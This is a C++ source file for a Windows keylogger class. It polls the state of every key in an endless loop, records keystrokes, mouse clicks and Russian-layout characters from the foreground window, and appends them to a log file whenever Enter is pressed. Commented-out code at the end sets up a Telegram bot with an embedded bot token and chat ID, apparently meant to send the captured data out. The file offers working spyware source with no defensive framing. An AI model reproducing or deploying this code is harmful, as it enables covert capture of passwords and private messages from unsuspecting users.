﻿#include "Logger.h"

Logger* Logger::instance = NULL;
LANGID Logger::langId = 9;
map <int, vector<char>> Logger::btnKeyRu = {};
map <int, vector<char>> Logger::btnKeyEn = {};

Logger::Logger() {
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
        is_capslock = true;
    }
}
void Logger::put(char simbol)
{
	instance->simbols += simbol;
}
string Logger::get() {
	return instance->simbols;
}
Logger* Logger::getInstance()
{
	if (instance == NULL) {
		instance = new Logger();
	}
	return instance;
}

void Logger::run()
{
    Logger* log = Logger::getInstance();
    while (true) {
        instance->saver();
    }
}


void Logger::saver() {
    unsigned char lpKeyboard[256];
    char d;
    instance->hwnd = GetForegroundWindow();
    WORD rusLangId = MAKELANGID(LANG_RUSSIAN, SUBLANG_DEFAULT);
    HKL kLayout = GetKeyboardLayout(GetWindowThreadProcessId(instance->hwnd, &instance->processId));
    for (unsigned char c = 1; c < 255; c++) {
        if (GetAsyncKeyState(c) & 1)
        {
            switch (c)
            {
            case VK_LBUTTON:
                instance->simbols += "<LMOUSE>";
                break;

            case VK_RBUTTON:
                instance->simbols += "<RMOUSE>";
                break;

            case VK_MBUTTON:
                instance->simbols +=  "<MMOUSE>";
                break;

            case VK_RETURN:
                instance->saveToFile();
                break;

            case VK_LCONTROL:
            case VK_RCONTROL:
            case VK_LMENU:
            case VK_RMENU:
                break;

            case VK_CONTROL:
                instance->simbols +=  "<CTRL>";
                break;

            case VK_MENU:
                instance->simbols +=  "<ALT>";
                break;

            case VK_BACK:
                instance->simbols +=  "<BACKSPACE>";
                break;

            case VK_TAB:
                instance->simbols +=  "<TAB>";
                break;

            case VK_ESCAPE:
                instance->simbols +=  "<ESC>";
                break;

            case VK_PRIOR:
                instance->simbols +=  "<PAGE UP>";
                break;

            case VK_NEXT:
                instance->simbols +=  "<PAGE DOWN>";
                break;

            case VK_END:
                instance->simbols +=  "<END>";
                break;

            case VK_HOME:
                instance->simbols +=  "<HOME>";
                break;

            case VK_LEFT:
                instance->simbols +=  "<ARROW LEFT>";
                break;

            case VK_UP:
                instance->simbols +=  "<ARROW UP>";
                break;

            case VK_RIGHT:
                instance->simbols +=  "<ARROW RIGHT>";
                break;

            case VK_DOWN:
                instance->simbols +=  "<ARROW DOWN>";
                break;

            case VK_INSERT:
                instance->simbols +=  "<INS>";
                break;

            case VK_DELETE:
                instance->simbols +=  "<DEL>";
                break;

            case VK_LWIN:
            case VK_RWIN:
                instance->simbols +=  "<WIN>";
                break;

            case VK_MULTIPLY:
                instance->simbols +=  "<NUM *>";
                break;

            case VK_ADD:
                instance->simbols +=  "<NUM +>";
                break;

            case VK_SUBTRACT:
                instance->simbols +=  "<NUM ->";
                break;

            case VK_DIVIDE:
                instance->simbols +=  "<NUM />";
                break;

            case VK_CAPITAL:
                instance->simbols +=  "<CAPS>";
                break;

            case VK_NUMLOCK:
                instance->simbols +=  "<NUM>";
                break;

            case VK_SCROLL:
                instance->simbols +=  "<SCROLL>";
                break;

            case VK_SNAPSHOT:
                instance->simbols +=  "<PRINT SCREEN>";
                break;

            case VK_PAUSE:
                instance->simbols +=  "<PAUSE>";
                break;

            case VK_DECIMAL:
                instance->simbols +=  "<NUM .>";
                break;

            case VK_OEM_PLUS:
                instance->simbols +=  "+";
                break;

            case VK_OEM_COMMA:
                if (LOWORD(kLayout) == rusLangId)
                    instance->simbols +=  "á";
                else
                    instance->simbols +=  ",";
                break;

            case VK_OEM_MINUS:
                instance->simbols +=  "-";
                break;

            case VK_OEM_PERIOD:
                if (LOWORD(kLayout) == rusLangId)
                    instance->simbols +=  "þ";
                else
                    instance->simbols +=  ".";
                break;

            case VK_APPS:
                instance->simbols +=  "<APP>";
                break;

            case VK_OEM_1:
                if (LOWORD(kLayout) == rusLangId)
                    instance->simbols +=  "æ";
                else
                    instance->simbols +=  ";";
                break;

            case VK_OEM_2:
                instance->simbols +=  "?";
                break;

            case VK_OEM_3:
                instance->simbols +=  "~";
                break;

            case VK_OEM_4:
                if (LOWORD(kLayout) == rusLangId)
                    instance->simbols +=  "õ";
                else
                    instance->simbols +=  "[";
                break;

            case VK_OEM_5:
                instance->simbols +=  "\\";
                break;

            case VK_OEM_6:
                if (LOWORD(kLayout) == rusLangId)
                    instance->simbols +=  "ú";
                else
                    instance->simbols +=  "]";
                break;

            case VK_OEM_7:
                if (LOWORD(kLayout) == rusLangId)
                    instance->simbols +=  "ý";
                else
                    instance->simbols +=  "'";
                break;

            default:
                if ((c >= 0x41 && c <= 0x5A) ||
                    (c >= 0x30 && c <= 0x39) ||
                    (c == VK_SPACE))
                {
                    GetKeyboardState(lpKeyboard);
                    ToUnicodeEx(c, MapVirtualKey(c, 0), lpKeyboard, &wChar, 2, 0, kLayout);
                    WideCharToMultiByte(CP_ACP, 0, &wChar, -1, &d, 1, NULL, NULL);
                    short G = GetKeyState(VK_LSHIFT);
                    if (GetAsyncKeyState(VK_RSHIFT) & 1 || GetKeyState(VK_LSHIFT) & 1) {
                        d = toUpper(d);
                    }
                    instance->simbols +=  d;
                }
                else if (c >= VK_NUMPAD0 && c <= VK_NUMPAD9)
                    instance->simbols += (c - 96);
                else if (c >= VK_F1 && c <= VK_F12)
                    instance->simbols += (c - 111);
                break;
            }         
        }

    }
}

char Logger::toUpper(char letter) {
    return letter - 32;
}


void Logger::saveToFile() {
    ofstream f("loggs.txt", ios::app);
    if (f.is_open()) {
        f << instance->simbols << endl;
    }
    f.close();
}

//TgBot::Bot bot("6374688261:AAEHPkpT06dTrBu07_muKx3TXjvcSymM9vM");
//bot.getApi().sendMessage("1332422290", "Hi!");
//bot.getEvents().onCommand("start", [&bot](TgBot::Message::Ptr message) {
//    bot.getApi().sendMessage(message->chat->id, "Hi!" + std::to_string(message->chat->id));
//    });
//bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {
//    printf("User wrote %s\n", message->text.c_str());
//    if (StringTools::startsWith(message->text, "/start")) {
//        return;
//    }
//    bot.getApi().sendMessage(message->chat->id, "Your message is: " + message->text);
//    });
//try {
//    printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
//    TgBot::TgLongPoll longPoll(bot);
//    while (true) {
//        printf("Long poll started\n");
//        longPoll.start();
//    }
//}
//catch (TgBot::TgException& e) {
//    printf("error: %s\n", e.what());
//}
//return 0;